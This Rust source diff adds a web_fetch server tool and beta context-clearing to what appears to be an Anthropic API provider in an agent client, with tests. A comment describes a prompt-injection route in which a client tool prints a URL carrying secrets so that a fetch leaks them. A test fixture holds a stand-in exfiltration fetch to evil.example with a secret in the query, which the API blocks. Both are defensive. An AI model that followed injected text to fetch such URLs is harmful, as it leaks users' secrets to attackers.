@@ -4,11 +4,12 @@ use serde_json::json;
 use std::collections::HashMap;
 use std::sync::Mutex;
 
-use super::{ContentBlock, Message, Provider, Request, Response, Usage};
+use super::{ContentBlock, Message, Provider, Request, Response, Usage, WEB_FETCH_TOOL};
 
 const API_URL: &str = "https://api.anthropic.com/v1/messages";
 const COUNT_TOKENS_URL: &str = "https://api.anthropic.com/v1/messages/count_tokens";
 const MODELS_URL: &str = "https://api.anthropic.com/v1/models";
+const CONTEXT_MANAGEMENT_BETA: &str = "context-management-2025-06-27";
 
 // What a model supports, from the Models API `capabilities` object. Parsed in
 // one place (`parse_caps`) so a new capability is one field plus one line.
@@ -20,15 +21,18 @@ pub struct ModelCaps {
     pub programmatic_tools: bool,
     // Models without it (e.g. the 4.5 family) take only manual extended thinking.
     pub adaptive_thinking: bool,
+    // Server-side clearing of old tool results (context editing, beta).
+    pub clear_tool_uses: bool,
 }
 
 // Direct-only search works on every web-search-capable model, so it is the
 // safe guess when the Models API can't say; adaptive thinking matches every
-// current model.
+// current model. A beta feature is never assumed.
 const UNKNOWN_CAPS: ModelCaps = ModelCaps {
     web_search: true,
     programmatic_tools: false,
     adaptive_thinking: true,
+    clear_tool_uses: false,
 };
 
 // The request pieces shaped from one capability lookup.
@@ -36,6 +40,7 @@ struct WireParts {
     system: Vec<serde_json::Value>,
     tools: Vec<serde_json::Value>,
     messages: Vec<serde_json::Value>,
+    context_management: Option<serde_json::Value>,
     caps: ModelCaps,
     warning: Option<String>,
 }
@@ -152,6 +157,7 @@ impl AnthropicProvider {
 
         let (caps, warning) = self.model_caps(req.model).await;
         let (mut tools, boundary) = tools_for(req, caps);
+        let context_management = context_management(&tools, caps);
         if let Some(i) = boundary
             && let Some(serde_json::Value::Object(obj)) = tools.get_mut(i)
         {
@@ -162,23 +168,26 @@ impl AnthropicProvider {
             system,
             tools,
             messages: messages_with_floating_breakpoint(req.messages),
+            context_management,
             caps,
             warning,
         }
     }
 }
 
-// The caller's tools plus any provider-side server tool the request asks for.
-// The server tool goes first so the caller's stable prefix keeps its order;
-// the cache boundary shifts with it.
+// The caller's tools plus any provider-side server tools the request asks for.
+// The server tools go first so the caller's stable prefix keeps its order;
+// the cache boundary shifts with them.
 fn tools_for(req: &Request<'_>, caps: ModelCaps) -> (Vec<serde_json::Value>, Option<usize>) {
     let mut tools = req.tools.clone();
     let mut boundary = req.tool_cache_boundary;
-    if req.web_search
-        && let Some(tool) = web_search_tool(caps)
-    {
-        tools.insert(0, tool);
-        boundary = boundary.map(|i| i + 1);
+    if req.web_search {
+        let server_tools: Vec<_> = [web_search_tool(caps), web_fetch_tool(caps)]
+            .into_iter()
+            .flatten()
+            .collect();
+        boundary = boundary.map(|i| i + server_tools.len());
+        tools.splice(0..0, server_tools);
     }
     (tools, boundary)
 }
@@ -209,28 +218,94 @@ fn complete_body(req: &Request<'_>, parts: WireParts) -> serde_json::Value {
     if let Some(container) = req.container {
         body["container"] = json!(container);
     }
+    if let Some(cm) = parts.context_management {
+        body["context_management"] = cm;
+    }
     body
 }
 
-// Dynamic filtering (search results filtered by code before they reach
-// context) needs programmatic tool calling; without it the API rejects any
-// caller but "direct". "direct" stays allowed either way so the model can
-// still search without writing code.
+// A fetched PDF ignores `max_content_tokens` and comes back whole (often
+// 100k+ tokens), then rides along on every later request, so old web_fetch
+// results are cleared server-side. Every other tool is excluded: their
+// results stay exactly as nudge sent them.
+fn context_management(tools: &[serde_json::Value], caps: ModelCaps) -> Option<serde_json::Value> {
+    let names: Vec<&str> = tools.iter().filter_map(|t| t["name"].as_str()).collect();
+    if !caps.clear_tool_uses || !names.contains(&WEB_FETCH_TOOL) {
+        return None;
+    }
+    let exclude_tools: Vec<&str> = names.into_iter().filter(|n| *n != WEB_FETCH_TOOL).collect();
+    Some(json!({
+        "edits": [{
+            "type": "clear_tool_uses_20250919",
+            "trigger": { "type": "input_tokens", "value": 100000 },
+            "keep": { "type": "tool_uses", "value": 0 },
+            "clear_at_least": { "type": "input_tokens", "value": 20000 },
+            "exclude_tools": exclude_tools,
+        }]
+    }))
+}
+
+fn beta_header(body: &serde_json::Value) -> Option<&'static str> {
+    body.get("context_management")
+        .map(|_| CONTEXT_MANAGEMENT_BETA)
+}
+
+// Attributed to the API: its `cleared_input_tokens` counts a fetched PDF's
+// raw base64, far more than the PDF costs in the prompt.
+fn cleared_notice(cm: Option<&WireContextManagement>) -> Option<String> {
+    let edits = &cm?.applied_edits;
+    let tokens: u64 = edits.iter().map(|e| e.cleared_input_tokens).sum();
+    let uses: u64 = edits.iter().map(|e| e.cleared_tool_uses).sum();
+    (tokens > 0).then(|| {
+        format!(
+            "cleared {uses} old web fetch result{} (API reports ~{} tokens)",
+            if uses == 1 { "" } else { "s" },
+            super::approx(tokens as usize)
+        )
+    })
+}
+
+// Dynamic filtering (search or fetch results filtered by code before they
+// reach context) needs programmatic tool calling; without it the API rejects
+// any caller but "direct". "direct" stays allowed either way so the model can
+// still search and fetch without writing code.
+fn allowed_callers(caps: ModelCaps) -> serde_json::Value {
+    if caps.programmatic_tools {
+        json!(["direct", "code_execution_20260120"])
+    } else {
+        json!(["direct"])
+    }
+}
+
 fn web_search_tool(caps: ModelCaps) -> Option<serde_json::Value> {
     if !caps.web_search {
         return None;
     }
-    let allowed_callers = if caps.programmatic_tools {
-        json!(["direct", "code_execution_20260120"])
-    } else {
-        json!(["direct"])
-    };
     Some(json!({
         "type": "web_search_20260318",
         "name": "web_search",
         "max_uses": 5,
-        "allowed_callers": allowed_callers,
+        "allowed_callers": allowed_callers(caps),
         "response_inclusion": "excluded",
+    }))
+}
+
+// The Models API reports no fetch capability, so fetch rides on web search's.
+fn web_fetch_tool(caps: ModelCaps) -> Option<serde_json::Value> {
+    if !caps.web_search {
+        return None;
+    }
+    Some(json!({
+        "type": "web_fetch_20260318",
+        "name": "web_fetch",
+        "max_uses": 5,
+        "max_content_tokens": 25000,
+        "allowed_callers": allowed_callers(caps),
+        "response_inclusion": "excluded",
+        // A prompt injection could make a client tool (e.g. Bash) print a URL
+        // with secrets in its query string; fetching it would leak them from
+        // Anthropic's servers, past any local firewall.
+        "url_sources": { "client_tool_results": { "type": "none" } },
     }))
 }
 
@@ -256,6 +331,12 @@ fn parse_caps(caps: Option<&WireCapabilities>) -> Option<ModelCaps> {
                 .and_then(|t| t.adaptive.as_ref()),
         )
         .unwrap_or(UNKNOWN_CAPS.adaptive_thinking),
+        clear_tool_uses: supported(
+            caps.context_management
+                .as_ref()
+                .and_then(|c| c.clear_tool_uses_20250919.as_ref()),
+        )
+        .unwrap_or(UNKNOWN_CAPS.clear_tool_uses),
     })
 }
 
@@ -264,12 +345,16 @@ impl Provider for AnthropicProvider {
         let parts = self.wire_parts(req).await;
         let warning = parts.warning.clone();
         let body = complete_body(req, parts);
-        let resp = self
+        let mut post = self
             .client
             .post(API_URL)
             .header("x-api-key", &self.api_key)
             .header("anthropic-version", "2023-06-01")
-            .header("content-type", "application/json")
+            .header("content-type", "application/json");
+        if let Some(beta) = beta_header(&body) {
+            post = post.header("anthropic-beta", beta);
+        }
+        let resp = post
             .json(&body)
             .send()
             .await
@@ -290,6 +375,7 @@ impl Provider for AnthropicProvider {
             },
             container_id: resp.container.map(|c| c.id),
             warning,
+            context_cleared: cleared_notice(resp.context_management.as_ref()),
         })
     }
 
@@ -298,18 +384,25 @@ impl Provider for AnthropicProvider {
         // `thinking`; it accepts the same system/tools/messages shape (cache
         // markers included, which it tolerates).
         let parts = self.wire_parts(req).await;
-        let body = json!({
+        let mut body = json!({
             "model": req.model,
             "system": parts.system,
             "tools": parts.tools,
             "messages": parts.messages,
         });
-        let resp = self
+        if let Some(cm) = parts.context_management {
+            body["context_management"] = cm;
+        }
+        let mut post = self
             .client
             .post(COUNT_TOKENS_URL)
             .header("x-api-key", &self.api_key)
             .header("anthropic-version", "2023-06-01")
-            .header("content-type", "application/json")
+            .header("content-type", "application/json");
+        if let Some(beta) = beta_header(&body) {
+            post = post.header("anthropic-beta", beta);
+        }
+        let resp = post
             .json(&body)
             .send()
             .await
@@ -355,6 +448,21 @@ struct MessagesResponse {
     #[serde(default)]
     usage: WireUsage,
     container: Option<WireContainer>,
+    context_management: Option<WireContextManagement>,
+}
+
+#[derive(Deserialize, Debug)]
+struct WireContextManagement {
+    #[serde(default)]
+    applied_edits: Vec<WireAppliedEdit>,
+}
+
+#[derive(Deserialize, Debug)]
+struct WireAppliedEdit {
+    #[serde(default)]
+    cleared_tool_uses: u64,
+    #[serde(default)]
+    cleared_input_tokens: u64,
 }
 
 #[derive(Deserialize, Debug)]
@@ -378,8 +486,14 @@ struct ModelInfo {
 #[derive(Deserialize, Debug)]
 struct WireCapabilities {
     code_execution: Option<WireSupport>,
+    context_management: Option<WireContextManagementCaps>,
     server_tools: Option<WireServerTools>,
     thinking: Option<WireThinking>,
+}
+
+#[derive(Deserialize, Debug)]
+struct WireContextManagementCaps {
+    clear_tool_uses_20250919: Option<WireSupport>,
 }
 
 #[derive(Deserialize, Debug)]
@@ -704,6 +818,7 @@ mod tests {
                 web_search: true,
                 programmatic_tools: true,
                 adaptive_thinking: true,
+                clear_tool_uses: false,
             })
         );
         assert_eq!(
@@ -719,8 +834,30 @@ mod tests {
                 web_search: true,
                 programmatic_tools: false,
                 adaptive_thinking: false,
+                clear_tool_uses: false,
             })
         );
+    }
+
+    #[test]
+    fn clear_tool_uses_cap_parses_present_absent_and_false() {
+        let with = |cm: &str| {
+            caps_of(&format!(
+                r#"{{"id": "m", "display_name": "M", "capabilities": {{{cm}}}}}"#
+            ))
+            .unwrap()
+            .clear_tool_uses
+        };
+        assert!(with(
+            r#""context_management": {"supported": true,
+                "clear_tool_uses_20250919": {"supported": true},
+                "clear_thinking_20251015": {"supported": true}}"#
+        ));
+        assert!(!with(
+            r#""context_management": {"clear_tool_uses_20250919": {"supported": false}}"#
+        ));
+        assert!(!with(r#""context_management": {"supported": true}"#));
+        assert!(!with(r#""code_execution": {"supported": true}"#));
     }
 
     #[test]
@@ -778,19 +915,106 @@ mod tests {
     }
 
     #[test]
-    fn search_tool_goes_first_and_shifts_the_boundary() {
+    fn server_tools_go_first_in_order_and_shift_the_boundary() {
         let caps = ModelCaps {
             programmatic_tools: true,
             ..UNKNOWN_CAPS
         };
         let (tools, boundary) = tools_for(&request("m", true, &[]), caps);
         assert_eq!(tools[0]["type"], "web_search_20260318");
-        assert_eq!(tools[1]["name"], "Read");
-        assert_eq!(boundary, Some(1));
+        assert_eq!(
+            tools[1],
+            json!({"type": "web_fetch_20260318", "name": "web_fetch", "max_uses": 5,
+                   "max_content_tokens": 25000,
+                   "allowed_callers": ["direct", "code_execution_20260120"],
+                   "response_inclusion": "excluded",
+                   "url_sources": {"client_tool_results": {"type": "none"}}})
+        );
+        assert_eq!(tools[2]["name"], "Read");
+        assert_eq!(boundary, Some(2));
 
-        let (tools, boundary) = tools_for(&request("m", false, &[]), caps);
-        assert_eq!(tools.len(), 2);
-        assert_eq!(boundary, Some(0));
+        let (tools, _) = tools_for(&request("m", true, &[]), UNKNOWN_CAPS);
+        assert_eq!(tools[0]["allowed_callers"], json!(["direct"]));
+        assert_eq!(tools[1]["type"], "web_fetch_20260318");
+        assert_eq!(tools[1]["allowed_callers"], json!(["direct"]));
+
+        let no_search = ModelCaps {
+            web_search: false,
+            ..caps
+        };
+        for (web_search, caps) in [(false, caps), (true, no_search)] {
+            let (tools, boundary) = tools_for(&request("m", web_search, &[]), caps);
+            assert_eq!(tools.len(), 2);
+            assert_eq!(tools[0]["name"], "Read");
+            assert_eq!(boundary, Some(0));
+        }
+    }
+
+    const WEB_FETCH_RESPONSE: &str = r#"{
+        "content": [
+            {"type": "server_tool_use", "id": "srvtoolu_f1", "name": "web_fetch",
+             "input": {"url": "https://tokio.rs/blog/2026-10-tokio-1-50"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f1", "content": {
+                "type": "web_fetch_result", "url": "https://tokio.rs/blog/2026-10-tokio-1-50",
+                "content": {"type": "document",
+                            "source": {"type": "text", "media_type": "text/plain",
+                                       "data": "Tokio 1.50 released. This release adds..."},
+                            "title": "Announcing Tokio 1.50", "citations": {"enabled": false}},
+                "retrieved_at": "2026-11-08T10:00:00.000000+00:00"}},
+            {"type": "server_tool_use", "id": "srvtoolu_f2", "name": "web_fetch",
+             "input": {"url": "https://example.com/paper.pdf"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f2", "content": {
+                "type": "web_fetch_result", "url": "https://example.com/paper.pdf",
+                "content": {"type": "document",
+                            "source": {"type": "base64", "media_type": "application/pdf",
+                                       "data": "JVBERi0xLjQKJcOkw7zDtsOf"},
+                            "citations": {"enabled": false}},
+                "retrieved_at": "2026-11-08T10:00:01.000000+00:00"}},
+            {"type": "server_tool_use", "id": "srvtoolu_f3", "name": "web_fetch",
+             "input": {"url": "https://evil.example/?k=secret"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f3",
+             "content": {"type": "web_fetch_tool_result_error", "error_code": "url_not_in_prior_context"}},
+            {"type": "server_tool_use", "id": "srvtoolu_exec", "name": "code_execution",
+             "input": {"code": "r = await web_fetch({\"url\": \"https://tokio.rs/blog\"})\nprint(len(r))"}},
+            {"type": "server_tool_use", "id": "srvtoolu_f4", "name": "web_fetch",
+             "input": {"url": "https://tokio.rs/blog"},
+             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"}},
+            {"type": "web_fetch_tool_result", "tool_use_id": "srvtoolu_f4",
+             "caller": {"type": "code_execution_20260120", "tool_id": "srvtoolu_exec"},
+             "content": {"type": "web_fetch_result", "url": "https://tokio.rs/blog",
+                         "content": {"type": "document",
+                                     "source": {"type": "text", "media_type": "text/plain", "data": "Blog"}},
+                         "retrieved_at": "2026-11-08T10:00:02.000000+00:00"}},
+            {"type": "code_execution_tool_result", "tool_use_id": "srvtoolu_exec",
+             "content": {"type": "code_execution_result", "stdout": "1",
+                         "stderr": "", "return_code": 0, "content": []}},
+            {"type": "text", "text": "Tokio 1.50 adds..."}
+        ],
+        "stop_reason": "end_turn",
+        "usage": {"input_tokens": 10, "output_tokens": 5}
+    }"#;
+
+    #[test]
+    fn web_fetch_blocks_round_trip_unchanged() {
+        let raw: serde_json::Value = serde_json::from_str(WEB_FETCH_RESPONSE).unwrap();
+        let resp: MessagesResponse = serde_json::from_str(WEB_FETCH_RESPONSE).unwrap();
+        assert_eq!(resp.content.len(), 11);
+        for (i, block) in resp.content.iter().enumerate() {
+            assert_eq!(
+                serde_json::to_value(block).unwrap(),
+                raw["content"][i],
+                "block {i} must round-trip"
+            );
+        }
+        for i in [1, 3, 5, 8] {
+            assert!(
+                matches!(&resp.content[i], ContentBlock::WebFetchToolResult { .. }),
+                "block {i}"
+            );
+        }
+        assert!(
+            matches!(&resp.content[8], ContentBlock::WebFetchToolResult { extra, .. } if extra.contains_key("caller"))
+        );
     }
 
     #[tokio::test]
@@ -802,6 +1026,7 @@ mod tests {
                 web_search: true,
                 programmatic_tools: false,
                 adaptive_thinking: false,
+                clear_tool_uses: false,
             },
         );
         let req = Request {
@@ -814,6 +1039,81 @@ mod tests {
         assert_eq!(body["thinking"]["type"], "enabled");
         assert_eq!(body["thinking"]["budget_tokens"], 8192);
         assert_eq!(body["tools"][0]["allowed_callers"], json!(["direct"]));
+        assert_eq!(body["tools"][1]["name"], "web_fetch");
+        assert_eq!(body["tools"][1]["allowed_callers"], json!(["direct"]));
+    }
+
+    #[tokio::test]
+    async fn context_management_clears_only_web_fetch_and_needs_fetch_and_caps() {
+        let provider = AnthropicProvider::new(String::new());
+        let clearing = ModelCaps {
+            clear_tool_uses: true,
+            ..UNKNOWN_CAPS
+        };
+        provider.caps.lock().unwrap().extend([
+            ("clearing".to_string(), clearing),
+            ("plain".to_string(), UNKNOWN_CAPS),
+            (
+                "no-search".to_string(),
+                ModelCaps {
+                    web_search: false,
+                    ..clearing
+                },
+            ),
+        ]);
+        let mut req = request("clearing", true, &[]);
+        req.tools.push(json!({"name": "mcp__gitlab__get_issue"}));
+        let body = complete_body(&req, provider.wire_parts(&req).await);
+        assert_eq!(
+            body["context_management"],
+            json!({"edits": [{
+                "type": "clear_tool_uses_20250919",
+                "trigger": {"type": "input_tokens", "value": 100000},
+                "keep": {"type": "tool_uses", "value": 0},
+                "clear_at_least": {"type": "input_tokens", "value": 20000},
+                "exclude_tools": ["web_search", "Read", "Dormant", "mcp__gitlab__get_issue"],
+            }]})
+        );
+        assert_eq!(beta_header(&body), Some("context-management-2025-06-27"));
+
+        for (model, web_search) in [("clearing", false), ("plain", true), ("no-search", true)] {
+            let req = request(model, web_search, &[]);
+            let body = complete_body(&req, provider.wire_parts(&req).await);
+            assert!(body.get("context_management").is_none(), "{model}");
+            assert_eq!(beta_header(&body), None, "{model}");
+        }
+    }
+
+    #[test]
+    fn applied_edits_become_a_cleared_notice() {
+        let parse = |cm: &str| {
+            let resp: MessagesResponse = serde_json::from_str(&format!(
+                r#"{{"content": [], "stop_reason": "end_turn"{cm}}}"#
+            ))
+            .unwrap();
+            cleared_notice(resp.context_management.as_ref())
+        };
+        assert_eq!(
+            parse(
+                r#", "context_management": {"applied_edits": [
+                    {"type": "clear_tool_uses_20250919", "cleared_tool_uses": 2,
+                     "cleared_input_tokens": 125300}]}"#
+            ),
+            Some("cleared 2 old web fetch results (API reports ~125.3k tokens)".into())
+        );
+        assert_eq!(
+            parse(
+                r#", "context_management": {"applied_edits": [
+                    {"type": "clear_tool_uses_20250919", "cleared_tool_uses": 1,
+                     "cleared_input_tokens": 900}]}"#
+            ),
+            Some("cleared 1 old web fetch result (API reports ~900 tokens)".into())
+        );
+        assert_eq!(
+            parse(r#", "context_management": {"applied_edits": []}"#),
+            None
+        );
+        assert_eq!(parse(""), None);
     }
 
     #[test]
@@ -830,6 +1130,7 @@ mod tests {
                 web_search: false,
                 programmatic_tools: true,
                 adaptive_thinking: true,
+                clear_tool_uses: false,
             })
         );
     }
